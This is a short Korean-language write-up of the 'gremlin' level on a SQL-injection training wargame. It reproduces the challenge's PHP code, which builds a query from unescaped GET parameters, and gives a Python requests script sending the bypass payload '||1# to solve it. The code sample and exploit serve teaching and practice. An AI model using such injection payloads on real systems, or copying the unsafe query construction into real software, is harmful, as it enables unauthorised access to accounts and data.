## GREMLIN Write-up

### 문제
``` php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```
### Exploit 코드
``` python
import requests

url = "http://los.rubiya.kr/gremlin_280c5552de8b681110e9287421b834fd.php"
session = {'PHPSESSID' : 'My PHPSESSID'}
data = {}
data['id'] = "'||1#"

res = requests.get(url, params=data, cookies=session)

if "Clear!" in res.text :
    print("[♪] GREMLIN Clear!")
```
python으로 HTTP 요청을 보내 응답을 받기 위해 requests 모듈을 사용했다.
``` php
if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
```
GET으로 전송된 id와 pw를 필터링 하는 부분이다.
``` php
$query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
```
id에서 싱글쿼터 필터링을 안하는 점을 이용해 우회할 수 있다.
id에 **'||1#** 을 입력해주면 쿼리문이 참이 된다.
``` php
select id from prob_gremlin where id=''||1#' and pw=''
```
쿼리문이 위와 같이 되고, **$result['id']** 에 값이 있어 문제가 풀린다.
